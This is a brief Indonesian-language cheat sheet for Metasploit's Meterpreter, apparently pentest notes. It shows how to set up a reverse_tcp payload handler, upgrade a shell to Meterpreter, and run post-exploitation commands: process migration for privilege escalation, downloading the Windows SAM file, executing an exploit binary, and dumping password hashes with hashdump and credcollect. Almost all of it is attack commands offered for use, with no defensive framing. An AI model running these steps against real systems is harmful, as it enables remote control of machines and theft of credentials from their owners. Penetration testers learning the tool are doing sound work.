# Meterpreter


## Establish
Dari multihandler (sebelum eksploitasi) menggunakan Metasploit
```sh
search multi\handler

# set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# set RHOSTS dan LHOSTS
set RHOSTS <ip>
set LHOST <ip>
```

Dari post exploit modul Metasploit

## Upgrade Shell Menjadi Meterpreter
Dilakukan post eksploitasi
```sh
# pindahkan shell saat ini menuju background
CTRL-Z

# gunakan shell_to_meterpreter pada post module
use post/multi/manage/shell_to_meterpreter

# cari dan upgrade session
sessions -l
set SESSION <nomor_session>
```

## Meterpreter Commands
```sh
# get user id and system info
getuid
sysinfo

# check whether it is a VM
checkvm

# search file
search -f *.exe

# check process and migrate to process (Privilege Escalation)
ps
migrate

# upload, download, and execute
upload file c:\\Users
download c:\\windows\\repair\\sam /tmp
execute -f c:\\windows\\temp\\exploit.exe

# change and quit shell
shell
CTRL+z

# dump hashes on computer
hashdump
credcollect

```

